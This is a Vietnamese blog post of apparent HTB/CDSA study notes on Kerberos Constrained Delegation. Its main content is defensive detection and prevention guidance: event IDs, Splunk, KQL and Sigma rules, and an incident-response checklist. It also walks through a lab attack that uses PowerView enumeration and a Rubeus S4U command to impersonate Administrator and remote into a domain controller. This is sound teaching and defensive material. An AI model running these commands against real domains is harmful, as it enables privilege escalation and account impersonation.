---
layout: post
title: "Kerberos Constrained Delegation"
date: 2026-07-12 22:45:26 +0700
categories: ["Windows Attacks & Defense", "Windows Internals & Authentication"]
tags: [active-directory, windows-attacks-defense, kerberos, constrained-delegation, s4u, rubeus, powerview, protected-users, event-4624, event-4768, event-4769, event-5136, splunk, elk, sigma, threat-hunting, incident-response, cdsa]
description: "Tóm tắt Kerberos Constrained Delegation: mô hình delegation, abuse S4U với Rubeus, prevention bằng Sensitive Account/Protected Users và detection theo hành vi Kerberos."
toc: true
---

# Kerberos Constrained Delegation

Bài này thuộc module **Windows Attacks & Defense**, tập trung vào cơ chế **Kerberos Constrained Delegation (KCD)**, rủi ro khi account delegation bị compromise và cách phòng thủ/phát hiện theo góc nhìn SOC/CDSA.

```text
Mục tiêu: hiểu S4U, msDS-AllowedToDelegateTo, TrustedToAuthForDelegation,
cách attacker impersonate user và cách phát hiện bằng Windows Security logs.
```

> Chỉ thực hành trong HTB, lab hoặc hệ thống có ủy quyền rõ ràng. Không sử dụng delegation abuse ngoài phạm vi cho phép.

---

## Timeline cập nhật

```text
Created at: 2026-07-12 22:45:26 +0700
Timezone: Asia/Ho_Chi_Minh
Module: Windows Attacks & Defense
Section: Kerberos Constrained Delegation
Focus: S4U, PowerView, Rubeus, 4624/4768/4769, Protected Users, threat hunting
```

---

# 1. Kerberos Delegation là gì?

Kerberos Delegation cho phép một service truy cập service khác **thay mặt user**.

Ví dụ:

```text
User → Web Server → SQL Server
```

Web service không cần biết password của user, nhưng có thể request service ticket để truy cập SQL thay user.

---

# 2. Ba loại Delegation

| Loại | Mô tả |
|---|---|
| Unconstrained Delegation | Account có thể delegate tới nhiều service, phạm vi rộng nhất |
| Constrained Delegation | Chỉ delegate tới service được chỉ định |
| Resource-Based Constrained Delegation | Resource xác định account nào được phép delegate tới nó |

```text
Mọi loại delegation đều tạo security risk và chỉ nên bật khi thực sự cần.
```

---

# 3. Các thuộc tính AD quan trọng

KCD thường liên quan:

```text
msDS-AllowedToDelegateTo
TRUSTED_TO_AUTH_FOR_DELEGATION
```

`msDS-AllowedToDelegateTo` lưu danh sách SPN mà account được phép delegate tới.

`TRUSTED_TO_AUTH_FOR_DELEGATION` cho phép protocol transition qua S4U2Self.

---

# 4. S4U là gì?

**Service for User (S4U)** là extension của Kerberos cho phép service request ticket thay mặt user.

Hai bước quan trọng:

```text
S4U2Self  → service lấy ticket đại diện cho user
S4U2Proxy → service dùng ticket đó để request ticket tới service đích
```

Điểm nguy hiểm:

```text
Service account không cần biết password của user bị impersonate.
```

---

# 5. Attack Flow

```text
1. Attacker compromise account có KCD.
2. Enumerate msDS-AllowedToDelegateTo.
3. Request TGT cho service account.
4. Dùng S4U2Self để impersonate privileged user.
5. Dùng S4U2Proxy để request service ticket tới SPN được phép.
6. Inject ticket vào current session.
7. Truy cập service đích dưới identity bị impersonate.
```

---

# 6. Enumerate Delegation bằng PowerView

Trong HTB lab:

```powershell
. .\PowerView-main.ps1
Get-NetUser -TrustedToAuth
```

Thông tin cần chú ý:

```text
samaccountname
useraccountcontrol
msds-allowedtodelegateto
serviceprincipalname
pwdlastset
```

Ví dụ:

```text
samaccountname           : webservice
useraccountcontrol       : TRUSTED_TO_AUTH_FOR_DELEGATION
msds-allowedtodelegateto : http/DC1.eagle.local
```

Điều này cho thấy account có thể delegate tới HTTP service trên DC1.

---

# 7. Tính Kerberos Key bằng Rubeus

Trong lab, Rubeus có thể chuyển cleartext password thành RC4/NTLM key:

```powershell
.\Rubeus.exe hash /password:<LAB_PASSWORD>
```

Output:

```text
rc4_hmac : <RC4_HASH>
```

Trong bài public nên redacted password và hash thật.

---

# 8. Request S4U Ticket

Ví dụ lab:

```powershell
.\Rubeus.exe s4u `
  /user:webservice `
  /rc4:<WEB_SERVICE_RC4_HASH> `
  /domain:eagle.local `
  /impersonateuser:Administrator `
  /msdsspn:"http/dc1" `
  /dc:dc1.eagle.local `
  /ptt
```

Ý nghĩa:

| Option | Mục đích |
|---|---|
| `/user` | Delegation account |
| `/rc4` | Kerberos key/NTLM hash |
| `/impersonateuser` | User cần impersonate |
| `/msdsspn` | Service đích |
| `/dc` | Domain Controller |
| `/ptt` | Inject ticket vào current session |

---

# 9. Kiểm tra Ticket

```powershell
klist
```

Ticket mong đợi:

```text
Client: Administrator @ EAGLE.LOCAL
Server: http/dc1 @ EAGLE.LOCAL
```

Sau đó trong lab có thể kiểm tra PowerShell Remoting:

```powershell
Enter-PSSession dc1
hostname
whoami
```

---

# 10. AltService và Service Mapping

Trong một số tình huống, attacker có thể abuse service mapping và request ticket cho service khác trên cùng host.

Ví dụ service:

```text
HTTP
CIFS
LDAP
HOST
TIME
```

Khả năng này phụ thuộc cấu hình delegation, SPN và cách service validation hoạt động.

---

# 11. Prevention

Hai biện pháp trực tiếp bảo vệ privileged user:

```text
Account is sensitive and cannot be delegated
Protected Users group
```

Khuyến nghị bổ sung:

- Treat delegation account như privileged account.
- Dùng password dài/random hoặc gMSA.
- Không để delegation account `PasswordNeverExpires` nếu không cần.
- Hạn chế SPN đích.
- Không delegate tới Domain Controller nếu không bắt buộc.
- Review `msDS-AllowedToDelegateTo`.
- Review `TRUSTED_TO_AUTH_FOR_DELEGATION`.
- Monitor ACL changes liên quan delegation.
- Ưu tiên AES và loại bỏ RC4 khi có thể.

---

# 12. Lưu ý về Protected Users

Protected Users giúp ngăn một số delegation và credential exposure, nhưng có thể ảnh hưởng ứng dụng legacy.

Trước khi áp production:

```text
Test compatibility
Review service dependencies
Pilot trên nhóm nhỏ
Theo dõi authentication failures
```

---

# 13. Detection bằng Event ID 4624

Delegated ticket được dùng để logon có thể tạo:

```text
Event ID 4624 - Successful logon
```

Field cần chú ý:

- Account Name.
- Logon Type.
- Source Network Address.
- Authentication Package.
- Transited Services.
- Target host.

`Transited Services` đôi khi được populate khi logon xuất phát từ S4U.

---

# 14. Detection bằng Event ID 4768 và 4769

Kerberos telemetry:

```text
4768 - TGT requested
4769 - Service ticket requested
```

Hunt theo:

- Service account request TGT từ workstation lạ.
- Privileged user TGS tới service bất thường.
- Request tới DC từ non-PAW.
- RC4 trong môi trường ưu tiên AES.
- Nhiều ticket cho các service khác nhau.
- S4U-related sequence từ delegation account.

---

# 15. Detection bằng Event ID 5136

Khi delegation configuration bị thay đổi:

```text
Event ID 5136 - A directory service object was modified
```

Attribute đáng chú ý:

```text
msDS-AllowedToDelegateTo
userAccountControl
msDS-AllowedToActOnBehalfOfOtherIdentity
```

Đây là telemetry quan trọng để phát hiện KCD/RBCD được thêm trái phép.

---

# 16. Splunk Detection

Privileged logon từ source bất thường:

```spl
index=wineventlog sourcetype=WinEventLog:Security EventCode=4624
Account_Name="Administrator"
| stats count values(Logon_Type) as logon_types
        values(Transited_Services) as transited_services
        values(host) as targets
  by Source_Network_Address
| sort - count
```

Kerberos ticket sequence:

```spl
index=wineventlog sourcetype=WinEventLog:Security
EventCode IN (4768,4769)
| bin _time span=5m
| stats values(EventCode) as events
        dc(Service_Name) as service_count
        values(Service_Name) as services
  by _time, Account_Name, Client_Address
| where service_count >= 3
```

Delegation property change:

```spl
index=wineventlog sourcetype=WinEventLog:Security EventCode=5136
AttributeLDAPDisplayName IN (
  "msDS-AllowedToDelegateTo",
  "userAccountControl",
  "msDS-AllowedToActOnBehalfOfOtherIdentity"
)
| table _time, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, OperationType
```

---

# 17. ELK/KQL

Successful delegated logon:

```kql
event.code: "4624" and winlog.event_data.TransitedServices: *
```

Delegation property modification:

```kql
event.code: "5136"
and winlog.event_data.AttributeLDAPDisplayName: (
  "msDS-AllowedToDelegateTo"
  or "msDS-AllowedToActOnBehalfOfOtherIdentity"
  or "userAccountControl"
)
```

Kerberos service-ticket activity:

```kql
event.code: "4769"
```

---

# 18. Sigma Rule

```yaml
title: Active Directory Delegation Attribute Modified
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5136
    AttributeLDAPDisplayName:
      - 'msDS-AllowedToDelegateTo'
      - 'msDS-AllowedToActOnBehalfOfOtherIdentity'
      - 'userAccountControl'
  condition: selection
falsepositives:
  - Approved delegation configuration changes
level: high
```

---

# 19. Threat Hunting

Hunt theo:

- Account có `TRUSTED_TO_AUTH_FOR_DELEGATION`.
- Delegation account có weak/old password.
- Delegation tới DC.
- Privileged user logon từ non-PAW.
- `Transited Services` bất thường.
- 5136 sửa delegation attributes.
- 4769 request nhiều service từ một account.
- Rubeus execution hoặc suspicious .NET process.

---

# 20. Incident Response Checklist

```text
[ ] Xác định delegation account bị compromise.
[ ] Xác định SPN đích trong msDS-AllowedToDelegateTo.
[ ] Review 4624, 4768, 4769, 5136.
[ ] Kiểm tra Transited Services.
[ ] Tìm Rubeus/PowerShell/.NET execution.
[ ] Purge active tickets nếu cần.
[ ] Rotate password/gMSA key.
[ ] Remove delegation không hợp lệ.
[ ] Đánh dấu privileged accounts là Sensitive.
[ ] Hunt lateral movement trên service đích.
```

---

# 21. Mapping với CDSA

## Security Operations & Monitoring

- Collect Security logs từ DC và target server.
- Baseline delegation accounts.
- Monitor privileged source hosts.
- Alert delegation-attribute changes.

## Incident Response & Forensics

- Triage source workstation.
- Tìm Rubeus artifacts và process creation.
- Xác định ticket scope và service đích.
- Review lateral movement.

## Threat Hunting

- Hunt S4U-related 4624/4769 patterns.
- Hunt delegation tới critical services.
- Hunt accounts có delegation + weak password.
- Hunt privileged account ngoài PAW.

## Detection Engineering

- Sigma cho Event 5136.
- Splunk/Elastic correlation.
- Baseline Transited Services.
- Correlate 5136 → 4769 → 4624.

---

# 22. Lab Setup

Môi trường tối thiểu:

```text
1 Domain Controller
1 service account có constrained delegation
1 Windows workstation
1 Splunk/ELK/Wazuh server
Sysmon + Windows Event Forwarding/agent
```

Log nên thu:

```text
Security: 4624, 4768, 4769, 5136, 4688
Sysmon: 1, 3
PowerShell Operational
```

---

# Key Takeaway

```text
Constrained Delegation cho service impersonate user tới service đích.
Nếu delegation account bị compromise, attacker có thể dùng S4U để impersonate privileged user.
msDS-AllowedToDelegateTo và TRUSTED_TO_AUTH_FOR_DELEGATION là thuộc tính trọng yếu.
Prevention chính là Protected Users, Sensitive Account, strong secret và delegation scope tối thiểu.
Detection cần correlate 4624, 4768, 4769 và 5136.
```

Kerberos Constrained Delegation là ví dụ điển hình cho CDSA: một tính năng hợp lệ của AD trở thành attack path khi quyền delegation hoặc service account bị quản lý sai.
